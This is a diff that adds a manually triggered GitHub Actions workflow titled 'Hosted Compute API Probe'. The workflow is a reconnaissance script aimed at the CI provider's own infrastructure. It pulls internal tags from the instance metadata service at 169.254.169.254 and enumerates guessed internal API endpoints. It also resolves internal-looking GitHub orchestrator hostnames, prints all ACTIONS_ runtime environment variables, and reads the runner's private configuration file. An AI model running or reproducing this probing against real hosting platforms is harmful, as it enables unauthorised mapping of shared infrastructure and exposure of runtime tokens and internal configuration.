@@ -1,0 +1,47 @@
+name: Hosted Compute API Probe
+on:
+  workflow_dispatch:
+
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Probe Hosted Compute API
+        run: |
+          echo "=== HOSTED COMPUTE API ENUMERATION ==="
+          
+          # Get the base URL from IMDS tags
+          BASE_URL=$(curl -s -H "Metadata:true" "http://169.254.169.254/metadata/instance/compute/tagsList?api-version=2021-02-01" | jq -r '.[] | select(.name=="hosted_compute.base_ro_url") | .value')
+          ALLOC_ID=$(curl -s -H "Metadata:true" "http://169.254.169.254/metadata/instance/compute/tagsList?api-version=2021-02-01" | jq -r '.[] | select(.name=="hosted_compute.allocation_id") | .value')
+          
+          echo "Base URL: $BASE_URL"
+          echo "Allocation ID: $ALLOC_ID"
+          echo ""
+          
+          # Try various endpoints
+          for endpoint in "" "/" "/health" "/status" "/vm" "/allocation" "/allocation/$ALLOC_ID" "/jobs" "/runners" "/$ALLOC_ID"; do
+            echo "=== Testing: ${BASE_URL}${endpoint} ==="
+            curl -sv -m 5 "${BASE_URL}${endpoint}" 2>&1 | head -20
+            echo ""
+          done
+          
+          echo "=== GITHUB INTERNAL DNS RESOLUTION ==="
+          for host in \
+            "hosted-compute-request-orchestrator-prod-eus-01.githubapp.com" \
+            "hosted-compute-request-orchestrator-prod-eus-02.githubapp.com" \
+            "actions-runner-controller.github.internal" \
+            "actions.github.internal" \
+            "api.github.localhost" \
+            "ghcr.io"; do
+            echo -n "$host: "
+            dig +short $host 2>/dev/null | head -1 || echo "NXDOMAIN"
+          done
+          
+          echo ""
+          echo "=== ACTIONS RUNTIME URLS ==="
+          env | grep -i "ACTIONS_" | sort || true
+          
+          echo ""
+          echo "=== RUNNER INTERNAL CONFIG ==="
+          cat /home/runner/.runner 2>/dev/null || true
+          ls -la /home/runner/ 2>/dev/null | head -20
